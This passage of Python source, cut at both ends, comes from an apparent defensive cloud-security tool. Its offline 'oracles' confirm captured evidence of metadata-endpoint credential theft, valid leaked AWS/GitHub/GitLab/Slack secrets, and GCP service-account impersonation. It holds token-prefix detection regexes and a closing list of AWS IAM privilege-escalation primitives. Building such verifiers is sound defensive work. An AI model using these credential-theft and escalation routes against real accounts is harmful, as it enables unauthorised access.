                          f"(identity={who!r}, expiry={ident['expiry']!r}), and the runner bound the exact "
                          f"token to that call over a trusted transport (fingerprint match + metadata/"
                          f"googleapis peers, no proxy/redirect, validated TLS) — the token is proven usable. "
                          f"SUBJECT = the retained capture the WARDEN-gated runner produced; VIGIL "
                          f"re-derives the achieved effect over the retained evidence offline (no network)."),
                observed={"provider": "gcp", "reason": "imds_credential_authenticated",
                          "identity": who, "email": ident["email"], "sub": ident["sub"],
                          "expiry": ident["expiry"], "source": _imds_obs_source(source),
                          "bound": True, "confirming_call": "tokeninfo"})
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=("GCP access token retrieved from compute metadata but the confirming "
                      "tokeninfo/userinfo call FAILED or did not echo an identity (email/sub) + expiry — "
                      "not proven usable (stays a LEAD)"),
            observed={"provider": "gcp", "reason": "confirming_call_failed"})

    # -- neither: no structurally-valid credential FROM the metadata endpoint -------------------------
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence=("no structurally-valid cloud credential sourced from the instance metadata endpoint in "
                  "the retained capture (AWS AccessKeyId+SecretAccessKey+Token from "
                  "169.254.169.254/iam/security-credentials, or a GCP Bearer access_token from "
                  "computeMetadata/v1/.../service-accounts/.../token) — not an IMDS credential capture "
                  "(stays a LEAD; a credential not from IMDS, a 401/timeout, or a random blob never fires)"),
        observed={"reason": "no_imds_credential",
                  "aws_akid_shape": _IMDS_AWS_AKID.match(akid) is not None,
                  "source": _imds_obs_source(source)})


# ==================================================================================================
# E5 (BUILD-PLAN §E5) — exposed-secret VALIDITY. See OracleKind.SECRET_CREDENTIAL_VALIDITY. Shares the
# confirming-side trust gate (`_confirming_call_trusted`) + the AWS identity extractor with the IMDS oracle.
# ==================================================================================================

# The non-secret IDENTIFIER shape per recognized type (the SECRET value is never seen — it is a [REDACTED]
# presence marker). AWS: the AccessKeyId (an identifier, not the secret). GitHub: the token PREFIX (the token
# itself is the secret; only its prefix is retained, and it is structurally recognizable).
_SECRET_AWS_KEY_ID_RE = re.compile(r"^(AKIA|ASIA)[0-9A-Z]{16}$")
_SECRET_GITHUB_PREFIX_RE = re.compile(r"^(gh[posru]_|github_pat_)")
# GitLab PAT (personal / project / group access token) — the fixed ``glpat-`` prefix. The RETAINED identifier
# is the bare prefix (the token body is the secret and is never retained), so this — like the GitHub prefix —
# matches the PREFIX, not the whole token. (The full-token shape lives in the discovery runner's own table.)
_SECRET_GITLAB_PREFIX_RE = re.compile(r"^glpat-")
# Slack API token — one of the fixed ``xox[baprse]-`` prefixes (bot/user/app/refresh/workspace/config). The
# retained identifier is the bare prefix; the token body is the secret.
_SECRET_SLACK_PREFIX_RE = re.compile(r"^xox[baprse]-")
# The per-TYPE confirming-endpoint host ALLOW-LIST (the anti-laundering gate). AWS STS regional/global only.
_SECRET_AWS_STS_HOST_RE = re.compile(r"^sts(\.[a-z0-9-]+)?\.amazonaws\.com$")


def _github_identity(body: Mapping[str, Any]) -> tuple[bool, dict[str, str]]:
    """Whether a GitHub ``GET /user`` response proves the token authenticated: a non-empty ``login`` AND a
    positive numeric ``id`` — the fields only an authenticated /user carries. A degenerate / absent identity
    does not prove authentication (positive-evidence-only)."""
    login = _imds_text(body.get("login")).strip()
    raw_id = body.get("id")
    if isinstance(raw_id, bool):
        id_ok = False
    elif isinstance(raw_id, (int, float)):
        id_ok = raw_id > 0
    else:
        t = _imds_text(raw_id).strip()
        id_ok = t.isdigit() and int(t) > 0
    return (bool(login) and id_ok), {"login": login, "id": _imds_text(raw_id).strip()}


def _gitlab_identity(body: Mapping[str, Any]) -> tuple[bool, dict[str, str]]:
    """Whether a GitLab ``GET /api/v4/user`` response proves the token authenticated: a non-empty
    ``username`` AND a positive numeric ``id`` — the fields only an authenticated /user carries. Mirrors
    ``_github_identity`` (positive-evidence-only; a degenerate/absent identity does not prove auth)."""
    username = _imds_text(body.get("username")).strip()
    raw_id = body.get("id")
    if isinstance(raw_id, bool):
        id_ok = False
    elif isinstance(raw_id, (int, float)):
        id_ok = raw_id > 0
    else:
        t = _imds_text(raw_id).strip()
        id_ok = t.isdigit() and int(t) > 0
    return (bool(username) and id_ok), {"username": username, "id": _imds_text(raw_id).strip()}


def _slack_identity(body: Mapping[str, Any]) -> tuple[bool, dict[str, str]]:
    """Whether a Slack ``auth.test`` response proves the token authenticated: the API-level ``ok`` flag is
    literally ``true`` (Slack answers HTTP 200 with ``ok:false`` for an invalid token, so the boolean, NOT the
    status, is the success signal) AND a non-empty ``user_id`` is echoed. Positive-evidence-only."""
    ok_flag = body.get("ok")
    user_id = _imds_text(body.get("user_id")).strip()
    authenticated = (ok_flag is True) and bool(user_id)
    return authenticated, {"ok": "true" if ok_flag is True else _imds_text(ok_flag),
                           "user_id": user_id, "team_id": _imds_text(body.get("team_id")).strip(),
                           "user": _imds_text(body.get("user")).strip()}


# The CLOSED recognizer set: secret_type -> {identifier shape, expected confirming action, identity
# extractor, confirming-host allow-list}. Adding a type is an auditable, one-row extension. Each row is
# FACT-capable only because it carries a SOUND identity-confirming endpoint (a benign read-only identity call
# whose echo proves WHICH identity authenticated) on a per-TYPE anti-laundering host allow-list — so a shape
# with no such endpoint (e.g. a Google API key, which is not identity-bound) is deliberately NOT a row here; it
# is a DISCOVERY-only LEAD (see integration/vigil_integration/live/secret_discovery.py). LIVE-FIRE proven for
# the github_pat row ONLY; aws_access_key/gitlab_pat/slack_token are built and unit-proven, not live-fire proven.
_SECRET_RECOGNIZERS: "dict[str, dict[str, Any]]" = {
    "aws_access_key": {
        "id_ok": lambda s: _SECRET_AWS_KEY_ID_RE.match(s) is not None,
        "action": "sts:getcalleridentity",
        "identity": _imds_aws_identity,
        "host_ok": lambda h: _SECRET_AWS_STS_HOST_RE.match(h) is not None,
    },
    "github_pat": {
        "id_ok": lambda s: _SECRET_GITHUB_PREFIX_RE.match(s) is not None,
        "action": "github:get /user",
        "identity": _github_identity,
        "host_ok": lambda h: h == "api.github.com",
    },
    "gitlab_pat": {
        "id_ok": lambda s: _SECRET_GITLAB_PREFIX_RE.match(s) is not None,
        "action": "gitlab:get /api/v4/user",
        "identity": _gitlab_identity,
        "host_ok": lambda h: h == "gitlab.com",
    },
    "slack_token": {
        "id_ok": lambda s: _SECRET_SLACK_PREFIX_RE.match(s) is not None,
        "action": "slack:auth.test",
        "identity": _slack_identity,
        "host_ok": lambda h: h == "slack.com",
    },
}


def exposed_secret_validity_oracle(observed: Any) -> OracleSignal:
    """Fire when a RETAINED, secret-safe capture PROVES an EXPOSED secret is VALID — the E5 achieved-effect
    confirmation. The DEFENSIVE dual of an attack: it re-derives, over the retained evidence ALONE (offline,
    no network, no attack), that a structurally-recognized leaked credential AUTHENTICATED as a real identity
    via a confirming call BOUND to it over a trusted, allow-listed transport. It never validates the secret's
    content (the secret is a ``[REDACTED]`` presence marker); it proves VALIDITY via the confirming call.

    SOURCE-SEMANTICS INVERSION vs the IMDS oracle: the exposure ``source`` (a JS literal, a git blob, a config
    path, a SecretsManager ARN) is RETAINED as evidence but is NOT a firing gate — E5 asserts VALIDITY, not
    provenance. The ANTI-LAUNDERING gate is on the CONFIRMING-CALL side: the confirming endpoint must be on
    the per-TYPE host allow-list (an AWS key confirmed ONLY against ``sts:GetCallerIdentity`` at
    ``sts[.<region>].amazonaws.com``; a GitHub PAT ONLY against ``api.github.com`` ``GET /user``; a GitLab PAT
    ONLY against ``gitlab.com`` ``GET /api/v4/user``; a Slack token ONLY against ``slack.com`` ``auth.test``),
    and the
    secret must be fingerprint-BOUND to that call over a validated-TLS, no-proxy, no-redirect transport — so
    an attacker-controlled 'confirming' endpoint can never launder an arbitrary string into a FACT.

    ``observed`` is the JSON-safe, SECRET-SAFE retained capture::

        {"secret_type": "aws_access_key" | "github_pat" | "gitlab_pat" | "slack_token",
         "credential": {"identifier": "AKIA…" | "ghp_…" (non-secret id/prefix), "secret": "[REDACTED]",
                        "credential_fingerprint": "…", "source": "js:app.min.js:1024" (evidence only)},
         "confirming_call": {"action": "sts:GetCallerIdentity" | "github:GET /user", "status": 200,
                             "credential_fingerprint": "…" (== credential's), "endpoint": "https://sts…/",
                             "tls_verified": true, "no_proxy": true, "no_redirect": true,
                             "resolved_peer": "…", "response_digest": "…", "response": {…identity echo…}}}

    Fires (0.95) ONLY when ALL hold (near-zero-FP by construction). Does NOT fire (stays an honest LEAD): an
    unrecognized secret type; a recognized-but-unconfirmed secret (no confirming call); a failed / 4xx /
    error-shaped-200 confirming call; a confirming action that does not match the type; an identity echo the
    type's extractor rejects; a fingerprint that does not bind the secret to the call; a confirming endpoint
    NOT on the type's allow-list (a laundering attempt); an unverified / proxied / redirected transport;
    malformed / absent evidence (never raises). Pure + deterministic, so the same verdict re-verifies offline
    from the retained context."""
    kind = OracleKind.SECRET_CREDENTIAL_VALIDITY
    if not isinstance(observed, Mapping):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="no exposed-secret validity evidence",
                            observed={"reason": "malformed_capture"})
    secret_type = _imds_text(observed.get("secret_type")).strip().lower()
    cred = observed.get("credential") if isinstance(observed.get("credential"), Mapping) else {}
    call = observed.get("confirming_call") if isinstance(observed.get("confirming_call"), Mapping) else {}
    resp = call.get("response") if isinstance(call.get("response"), Mapping) else {}

    recog = _SECRET_RECOGNIZERS.get(secret_type)
    if recog is None:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=(f"secret_type {secret_type!r} is not in the closed recognizer set "
                                      f"{sorted(_SECRET_RECOGNIZERS)} — cannot structurally recognize it "
                                      f"(stays a LEAD)"),
                            observed={"reason": "unrecognized_secret_type", "secret_type": secret_type})

    identifier = _imds_text(cred.get("identifier")).strip()
    if not recog["id_ok"](identifier):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=(f"the retained {secret_type} identifier {identifier!r} does not match "
                                      f"the recognized non-secret shape — not a structurally-valid secret of "
                                      f"this type (stays a LEAD)"),
                            observed={"reason": "secret_identifier_malformed", "secret_type": secret_type})

    if not call:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=(f"a structurally-recognized {secret_type} secret but NO confirming call "
                                      f"is retained — recognized-but-unconfirmed (a regex match is not proof "
                                      f"the secret is VALID; stays a LEAD)"),
                            observed={"reason": "no_confirming_call", "secret_type": secret_type})

    if not _imds_call_ok(resp, call.get("status")):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=(f"the confirming call for the {secret_type} secret did NOT succeed (no "
                                      f"explicit 2xx, or a failure marker in the body) — the secret is not "
                                      f"proven usable (stays a LEAD)"),
                            observed={"reason": "confirming_call_failed", "secret_type": secret_type})

    action = _imds_text(call.get("action")).strip().lower()
    if action != recog["action"]:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=(f"the confirming call's action {action!r} is not the expected "
                                      f"{recog['action']!r} for a {secret_type} secret — a mismatched / "
                                      f"wrong-endpoint confirmation is NOT accepted (stays a LEAD)"),
                            observed={"reason": "confirming_action_mismatch", "secret_type": secret_type,
                                      "action": action})

    id_ok, identity = recog["identity"](resp)
    if not id_ok:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=(f"the confirming call for the {secret_type} secret returned no valid "
                                      f"identity echo — cannot prove WHICH identity authenticated (stays a "
                                      f"LEAD)"),
                            observed={"reason": "identity_echo_absent", "secret_type": secret_type})

    secret_fp = _imds_text(cred.get("credential_fingerprint")).strip()
    call_fp = _imds_text(call.get("credential_fingerprint")).strip()
    if not secret_fp or not call_fp or secret_fp != call_fp:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=(f"the confirming call is not fingerprint-BOUND to the captured "
                                      f"{secret_type} secret (a domain-separated fingerprint present in BOTH "
                                      f"and EQUAL) — the call may have used a DIFFERENT secret; not a bound "
                                      f"FACT (stays a LEAD)"),
                            observed={"reason": "secret_not_bound_to_confirming_call",
                                      "secret_type": secret_type})

    ok, reason = _confirming_call_trusted(call, recog["host_ok"])
    if not ok:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=(f"the confirming call for the {secret_type} secret is not over a "
                                      f"trusted, allow-listed transport ({reason}) — an un-allow-listed / "
                                      f"proxied / redirected / TLS-unverified confirmation cannot mint a FACT "
                                      f"(anti-laundering; stays a LEAD)"),
                            observed={"reason": reason, "secret_type": secret_type})

    return OracleSignal(
        kind=kind, fired=True, confidence=0.95,
        evidence=(f"Exposed-secret validity ({secret_type}): a structurally-recognized secret (identifier "
                  f"{identifier!r}, exposed at {_imds_text(cred.get('source'))!r}) AUTHENTICATED via "
                  f"{recog['action']} as identity {identity!r}, and the runner bound the exact secret to that "
                  f"call over a trusted, allow-listed transport (fingerprint match + per-type endpoint "
                  f"allow-list, no proxy/redirect, validated TLS) — the exposed secret is PROVEN valid. "
                  f"SUBJECT = the retained capture the WARDEN-gated runner produced; VIGIL re-derives the "
                  f"achieved effect over the retained evidence offline (no network)."),
        observed={"reason": "exposed_secret_validated", "secret_type": secret_type,
                  "identity": identity, "source": _imds_text(cred.get("source"))})


# ==================================================================================================
# E3 (BUILD-PLAN §E3) — GCP service-account IMPERSONATION. See OracleKind.GCP_SA_IMPERSONATION. Shares the
# confirming-side trust gate (`_confirming_call_trusted`) + the GCP identity extractor (`_imds_gcp_identity`)
# with the IMDS oracle, but is the OPPOSITE shape to E1: E1 gates on the SOURCE host (a credential retrieved
# FROM the metadata endpoint); E3 gates on the CONFIRMING-side identity echo (a MINTED impersonation token
# proven to authenticate AS the named target SA B at a trusted Google introspection endpoint).
# ==================================================================================================

# A well-formed GCP service-account email — the NAMED impersonation target B. The load-bearing discriminator
# is the `.gserviceaccount.com` suffix behind at least one project/appspot/developer subdomain label (a bare
# `x@gserviceaccount.com` is NOT a real SA and must not qualify). Covers user-managed
# (`name@project.iam.gserviceaccount.com`), default-compute (`num-compute@developer.gserviceaccount.com`),
# and appspot (`project@appspot.gserviceaccount.com`) forms. Applied to the LOWER-CASED target.
_GCP_SA_EMAIL_RE = re.compile(r"^[a-z0-9][a-z0-9._%+-]{0,62}@([a-z0-9-]+\.)+gserviceaccount\.com$")
# The iamcredentials impersonation MINT verbs. A method is a mint iff its VERB — the last `[:./]`-delimited
# token of the lower-cased method, so `iamcredentials:generateAccessToken`, a full resource URL ending
# `...serviceAccounts/<sa>:signJwt`, or a bare `getAccessToken` all resolve — is one of these, OR an actAs /
# serviceAccountTokenCreator authorization token appears anywhere in the method string.
_GCP_MINT_VERBS = frozenset({
    "generateaccesstoken", "getaccesstoken", "generateidtoken", "signjwt", "signblob",
})
_GCP_ACTAS_TOKENS = ("actas", "serviceaccounttokencreator")
# The confirming call must be a GCP token INTROSPECTION (the identity echo of the minted token).
_GCP_IMPERSONATION_ACTIONS = frozenset({
    "tokeninfo", "userinfo", "oauth2/v3/tokeninfo", "oauth2/v1/tokeninfo",
    "oauth2/v3/userinfo", "oauth2/v2/userinfo", "getuserinfo",
})
# The per-confirming-endpoint HOST allow-list (the ANTI-LAUNDERING gate — mirrors E5's `host_ok`): a
# tokeninfo/userinfo call proving the minted token's identity must resolve at a TRUSTED Google introspection
# endpoint. An attacker-controlled 'tokeninfo' host can never mint a FACT.
_GCP_IMPERSONATION_CONFIRM_HOSTS = frozenset({
    "oauth2.googleapis.com", "www.googleapis.com", "iamcredentials.googleapis.com",
    "openidconnect.googleapis.com",
})


def _gcp_mint_obj(capture: Mapping[str, Any]) -> Mapping[str, Any]:
    """The mint sub-object: a nested ``mint``/``impersonation``/… mapping, or the capture itself (a flat
    record). Never raises."""
    for k in ("mint", "impersonation", "token_mint", "mint_call"):
        v = capture.get(k)
        if isinstance(v, Mapping):
            return v
    return capture


def _gcp_mint_method_is_impersonation(method: str) -> bool:
    """True iff ``method`` denotes an iamcredentials impersonation mint (getAccessToken / generateAccessToken /
    generateIdToken / signJwt / signBlob — matched on the method's VERB, the last `[:./]`-delimited token, so a
    fully-qualified resource URL or an ``iamcredentials:``-prefixed method resolves) OR an actAs /
    serviceAccountTokenCreator flow (matched as a DELIMITED token — ``iam.serviceAccounts.actAs`` /
    ``roles/iam.serviceAccountTokenCreator`` — never as a mid-word substring, so a benign method that merely
    CONTAINS the letters cannot match). Never raises."""
    m = _coerce_text(method).strip().lower()
    tokens = [t for t in re.split(r"[:./]", m) if t]
    if not tokens:
        return False
    if tokens[-1] in _GCP_MINT_VERBS:
        return True
    return any(t in _GCP_ACTAS_TOKENS for t in tokens)


def _gcp_minted_token_present(mint: Mapping[str, Any]) -> bool:
    """A minted impersonation token was PRESENT at capture time — its presence is the structural fact (the
    binding fingerprint is its secret-safe proxy; the oracle never sees the token). Reads the redacted
    presence marker the reducer leaves, or any non-empty raw token field."""
    for k in ("token", "access_token", "accessToken", "id_token", "idToken", "signed_jwt", "signedJwt",
              "signed_blob", "signedBlob"):
        if _imds_text(mint.get(k)).strip():
            return True
    return False


def _gcp_sa_uid_ok(uid: str) -> bool:
    """A GCP unique-id (the SA's numeric ``unique_id`` / OIDC ``sub``) — a bounded numeric id. Mirrors the
    IMDS ``sub`` shape gate (>= 6 digits) so a degenerate 1-char id is never a valid target/echo."""
    return uid.isdigit() and len(uid) >= 6


def _gcp_target_identity(capture: Mapping[str, Any], mint: Mapping[str, Any]) -> tuple[str, str]:
    """The NAMED impersonation target B as ``(email, uid)`` — an SA email OR a numeric unique-id. Read from
    the mint's ``target``/``target_service_account``/… first, then the top-level capture. A malformed value
    is returned in the ``email`` slot (lower-cased) so it fails the ``_GCP_SA_EMAIL_RE`` gate downstream.
    Never raises."""
    val = ""
    for obj in (mint, capture):
        if not isinstance(obj, Mapping):
            continue
        for k in ("target_service_account", "target", "target_sa", "target_email", "target_principal",
                  "service_account", "sa"):
            v = obj.get(k)
            if v not in (None, ""):
                val = _imds_text(v).strip()
                break
        if val:
            break
    if val.isdigit():
        return "", val
    return val.lower(), ""


def gcp_sa_impersonation_oracle(observed: Any) -> OracleSignal:
    """Fire when a RETAINED, secret-safe capture PROVES a GCP service-account IMPERSONATION achieved effect —
    the E3 (BUILD-PLAN §E3) confirmation. The DEFENSIVE dual of an attack: it re-derives, over the retained
    evidence ALONE (offline, ZERO network, NO exploitation code), that a principal minted a short-lived token
    AS a named target service-account B (via iamcredentials getAccessToken / generateAccessToken / signJwt /
    an actAs / roles/iam.serviceAccountTokenCreator flow) AND that a confirming call ECHOED B's identity at a
    TRUSTED, allow-listed Google introspection endpoint, bound to the mint by a shared token fingerprint. It
    NEVER performs the impersonation — the live mint/introspect action is a separate WARDEN-gated runner; this
    pure oracle judges what that runner retained, so a confirmed FACT re-verifies OFFLINE from its certificate.

    E3 is the OPPOSITE shape to E1: E1 requires the credential SOURCE host to be the metadata endpoint; E3
    makes no claim about a source — it proves an impersonation TOKEN-MINT was confirmed by an identity echo of
    the TARGET SA. The ANTI-LAUNDERING gate (like E5) is entirely on the CONFIRMING-CALL side: the tokeninfo/
    userinfo call must resolve at a Google introspection host on the per-type allow-list, over a validated-TLS,
    no-proxy, no-redirect transport, so an attacker-controlled 'tokeninfo' endpoint can never launder a FACT.

    STATUS (E3) — **OFFLINE-WIRED; real-transport LIVE-FIRE deferred** on operator-provisioned GCP creds. The
    oracle stays OUT of the frozen ``_ALL_ORACLES`` fallback and fires ONLY when the ctx carries
    ``gcp_impersonation_capture`` (no benchmark/scan/engage finding does), so nothing on the scan path mints
    it — the capability fires ONLY when the producer is called explicitly over a runner capture.

    ``observed`` is the JSON-safe, SECRET-SAFE retained capture::

        {"mint": {"method": "generateAccessToken", "target": "svc-b@proj.iam.gserviceaccount.com",
                  "token": "[REDACTED]", "credential_fingerprint": "…"},
         "confirming_call": {"action": "tokeninfo", "status": 200, "credential_fingerprint": "…" (== mint's),
                             "endpoint": "https://oauth2.googleapis.com/tokeninfo", "tls_verified": true,
                             "no_proxy": true, "no_redirect": true, "resolved_peer": "…",
                             "response_digest": "…",
                             "response": {"email": "svc-b@proj.iam.gserviceaccount.com", "sub": "1029…",
                                          "expires_in": 3599}}}

    Fires (0.95) ONLY when ALL hold (near-zero-FP by construction):
      (1) the mint is an impersonation token-mint (an iamcredentials verb / an actAs/tokenCreator flow) that
          minted a token targeting a NAMED, well-formed target SA B (a ``*.gserviceaccount.com`` email or a
          numeric unique-id);
      (2) a confirming tokeninfo/userinfo call SUCCEEDED (explicit 2xx, no failure marker at any depth) and
          its identity echo (email/sub) EQUALS the named target SA B — an echo of a DIFFERENT SA does not
          prove B was impersonated;
      (3) the minted token is fingerprint-BOUND to that confirming call (a domain-separated fingerprint in
          BOTH and EQUAL — the token itself is never retained), AND the confirming call used a TRUSTED,
          allow-listed Google endpoint over a validated-TLS, no-proxy, no-redirect transport.

    Does NOT fire (stays an honest LEAD): a mint that is not an impersonation call; no minted token; a
    malformed target SA; no confirming call; a failed / 4xx / error-shaped confirming call; a confirming
    action that is not a token introspection; an echo that resolves a DIFFERENT SA than the target; a
    fingerprint that does not bind the mint to the call; a confirming endpoint NOT on the allow-list (a
    laundering attempt); an unverified / proxied / redirected transport; malformed / absent evidence (never
    raises). Pure + deterministic, so the same verdict re-verifies offline from the retained context."""
    kind = OracleKind.GCP_SA_IMPERSONATION
    if not isinstance(observed, Mapping):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="no GCP SA-impersonation evidence",
                            observed={"reason": "malformed_capture"})
    capture = observed
    mint = _gcp_mint_obj(capture)
    call = capture.get("confirming_call") if isinstance(capture.get("confirming_call"), Mapping) else {}
    resp = call.get("response") if isinstance(call.get("response"), Mapping) else {}

    # (1) a mint of an impersonation token targeting a NAMED, well-formed target SA B ---------------------
    method = _imds_text(mint.get("method") or mint.get("action"))
    if not _gcp_mint_method_is_impersonation(method):
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"the mint method {method.strip()!r} is not a GCP service-account impersonation call "
                      f"(iamcredentials getAccessToken/generateAccessToken/generateIdToken/signJwt/signBlob, "
                      f"or an actAs / serviceAccountTokenCreator flow) — not an impersonation (stays a LEAD)"),
            observed={"reason": "mint_method_not_impersonation", "method": method.strip()})
    if not _gcp_minted_token_present(mint):
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=("an impersonation mint method but NO minted token is retained — a mint attempt without a "
                      "captured token does not prove impersonation (stays a LEAD)"),
            observed={"reason": "no_minted_token"})
    target_email, target_uid = _gcp_target_identity(capture, mint)
    email_target_ok = bool(target_email) and _GCP_SA_EMAIL_RE.match(target_email) is not None
    uid_target_ok = bool(target_uid) and _gcp_sa_uid_ok(target_uid)
    if not (email_target_ok or uid_target_ok):
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"the impersonation mint names no well-formed target service-account "
                      f"(target={ (target_email or target_uid) or 'ABSENT'!r}) — a target that is not a "
                      f"*.gserviceaccount.com email or a numeric unique-id is not a named SA (stays a LEAD)"),
            observed={"reason": "target_sa_malformed", "target": target_email or target_uid})

    # (2) a confirming tokeninfo/userinfo call that ECHOES the SAME target SA B --------------------------
    if not call:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=("an impersonation token minted for the target SA but NO confirming tokeninfo/userinfo "
                      "call is retained — minted-but-unconfirmed (a mint alone does not prove the token "
                      "authenticates as B; stays a LEAD)"),
            observed={"reason": "no_confirming_call", "target": target_email or target_uid})
    action = _imds_text(call.get("action")).strip().lower()
    if action not in _GCP_IMPERSONATION_ACTIONS:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"the confirming call's action ({action or 'ABSENT'!r}) is not a GCP token introspection "
                      f"(tokeninfo/userinfo) — an absent/mismatched action does NOT prove the minted token "
                      f"authenticates as B (stays a LEAD)"),
            observed={"reason": "confirming_action_mismatch", "action": action})
    if not _imds_call_ok(resp, call.get("status")):
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=("the confirming tokeninfo/userinfo call did NOT succeed (no explicit 2xx, or a failure "
                      "marker in the body) — the minted token is not proven usable as B (stays a LEAD)"),
            observed={"reason": "confirming_call_failed", "target": target_email or target_uid})
    id_ok, ident = _imds_gcp_identity(resp)
    if not id_ok:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=("the confirming call returned no valid identity echo (email / numeric sub) — cannot "
                      "prove WHICH service-account the minted token resolves to (stays a LEAD)"),
            observed={"reason": "identity_echo_absent"})
    echo_email = ident["email"].strip().lower()
    echo_sub = ident["sub"].strip()
    if email_target_ok:
        matched = bool(echo_email) and echo_email == target_email
    else:
        matched = bool(echo_sub) and echo_sub == target_uid
    if not matched:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"the confirming identity echo (email={echo_email or '∅'!r}, sub={echo_sub or '∅'!r}) "
                      f"does NOT resolve the named target SA "
                      f"({(target_email or target_uid)!r}) — the minted token authenticates as a DIFFERENT "
                      f"principal, so it does not prove impersonation OF B (stays a LEAD)"),
            observed={"reason": "identity_echo_mismatch", "target": target_email or target_uid,
                      "echo_email": echo_email, "echo_sub": echo_sub})

    # (3) the minted token is fingerprint-BOUND to the confirming call, over a TRUSTED endpoint -----------
    mint_fp = _imds_text(mint.get("credential_fingerprint")).strip()
    call_fp = _imds_text(call.get("credential_fingerprint")).strip()
    if not mint_fp or not call_fp or mint_fp != call_fp:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=("the confirming call is not fingerprint-BOUND to the minted impersonation token (a "
                      "domain-separated fingerprint present in BOTH the mint and the confirming call and "
                      "EQUAL) — the call may have introspected a DIFFERENT token; not a bound FACT (LEAD)"),
            observed={"reason": "token_not_bound_to_confirming_call", "target": target_email or target_uid})
    ok, reason = _confirming_call_trusted(call, lambda h: h in _GCP_IMPERSONATION_CONFIRM_HOSTS)
    if not ok:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"the confirming tokeninfo/userinfo call is not over a trusted, allow-listed Google "
                      f"endpoint ({reason}) — an un-allow-listed / proxied / redirected / TLS-unverified "
                      f"confirmation cannot mint a FACT (anti-laundering; stays a LEAD)"),
            observed={"reason": reason, "target": target_email or target_uid})

    who = target_email or target_uid
    return OracleSignal(
        kind=kind, fired=True, confidence=0.95,
        evidence=(f"GCP service-account impersonation: an impersonation token was minted via {method.strip()!r} "
                  f"targeting service-account {who!r}, and a confirming {action} call authenticated with it "
                  f"and echoed that exact identity (email={ident['email']!r}, sub={ident['sub']!r}), with the "
                  f"runner binding the exact token to that call over a trusted, allow-listed Google endpoint "
                  f"(fingerprint match + introspection-host allow-list, no proxy/redirect, validated TLS) — a "
                  f"short-lived token valid AS {who!r} was proven minted. SUBJECT = the retained capture the "
                  f"WARDEN-gated runner produced; VIGIL re-derives the achieved effect over the retained "
                  f"evidence offline (no network)."),
        observed={"reason": "gcp_sa_impersonation_confirmed", "impersonated_sa": who, "method": method.strip(),
                  "confirming_call": action, "echo_email": ident["email"], "echo_sub": ident["sub"]})
# E2 (BUILD-PLAN §E2) — IAM PRIVILEGE-ESCALATION PRIMITIVE. See OracleKind.IAM_ESCALATION_PRIMITIVE.
#
# The ACHIEVED-ESCALATION dual of the REACHABILITY oracle (``policy_path_oracle``). That oracle proves a
# principal ALREADY reaches a resource over the retained grant graph; THIS oracle proves the retained IAM
# statements grant the principal an UNCONDITIONAL escalation PRIMITIVE that STRICTLY INCREASES what it can
# reach — a stronger claim on its own evidence branch. The soundness core is an explicit DIFFERENTIAL of two
# closures: the BASE closure (what the principal reaches without escalating) and the ESCALATION-CLOSED
# closure (base + the ONE synthesized edge the primitive grants). The oracle fires ONLY when the target is
# reachable in the escalation-closed closure but NOT in the base closure — that "strict gain" is the central
# anti-overclaim guard (a target a plain reachability path already reaches is NOT escalation, stays a LEAD).
#
# The escalation PRIMITIVE comes from a FIXED, auditable set (nothing outside it can synthesize an edge):
# trust-policy rewrite (sts:AssumeRole + iam:UpdateAssumeRolePolicy), iam:PassRole to a compute service,
# self policy-attach (iam:AttachUserPolicy / iam:PutUserPolicy), add-to-privileged-group (iam:AddUserToGroup),
# and create-credential-for-target (iam:CreateAccessKey / iam:CreateLoginProfile). A statement only grants a
# primitive when it does so UNCONDITIONALLY — fail-closed on every FP trap: a Condition, a NotAction, an
# explicit Deny (deny-precedence across identity policy + permissions boundary + SCP), a restricting boundary
# or SCP, or a Resource wildcard that does NOT actually cover the target contributes NO edge; an ambiguous /
# unparseable statement contributes NO edge. Pure + deterministic — re-verifies OFFLINE from the certificate
# exactly like ``policy_path_oracle``: re-run the two BFS closures over the retained statements, get the same
# verdict, byte-for-byte, with no cloud and no trust in the sensor that ingested the export.
# ==================================================================================================

# The compute-run actions that make an iam:PassRole a usable escalation (the run/create action that hands the
# passed role's credentials to a service the base principal controls). A CLOSED, auditable list.
_IAM_COMPUTE_RUN_ACTIONS: "tuple[str, ...]" = (
    "cloudformation:createstack", "datapipeline:activatepipeline", "datapipeline:createpipeline",
    "ec2:runinstances", "ecs:runtask", "glue:createdevendpoint", "lambda:createfunction",
    "lambda:invokefunction", "sagemaker:createnotebookinstance",
)

# The FIXED, auditable escalation-primitive set (BUILD-PLAN §E2), encoded explicitly. Each row names the IAM
# action(s) an UNCONDITIONAL Allow must grant and the ONE capability EDGE the primitive synthesizes into the
# policy graph. `all` = every action must be effective-allowed over `cover`; `any` = at least one, checked
# over `cover` (any_scope "cover") or over ANY resource (any_scope "anywhere" — the PassRole run-action leg,
# whose resource is a compute instance/function, not the role). `edge`: "assume"/"member_of" adds a
# base->via adjacency (base inherits via's grants); "grant_admin" adds a direct base->target admin grant
# (self-attach). `cover`: "via" (the principal escalated to) or "base" (self-escalation). `family` drives the
# world-model projection (a credential MINTED for the target uses the HELD-credential chain; a role/permission
